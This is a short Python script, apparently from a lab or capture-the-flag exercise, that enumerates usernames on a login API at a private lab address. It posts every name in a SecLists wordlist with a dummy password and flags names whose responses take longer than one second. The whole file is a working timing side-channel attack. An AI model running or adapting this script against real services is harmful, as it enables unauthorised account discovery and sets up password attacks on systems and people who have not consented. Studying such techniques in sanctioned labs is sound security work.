import requests
import time
from tqdm import tqdm

ip = "http://10.10.152.208"
end_point = "/api/user/login"

wordlist = "/usr/share/seclists/Usernames/Names/names.txt"



with open(wordlist, "r") as f:
    usernames = f.readlines()

found_usernames = []

for username in tqdm(usernames):
    payload = {"username":username.strip(),"password":"you mean"}

    start_time = time.time()

    res = requests.post(f"{ip}{end_point}", data=payload)

    end_time = time.time()
    time_taken = end_time - start_time
    if res.status_code != 200:
        print(f"Error: {res.status_code}")
    if time_taken>1:
        found_usernames.append(username)
        print(username, end="")
        print(time_taken, end="")
        print(res.status_code, end="")
        print(res.text, end="")
    
print(found_usernames)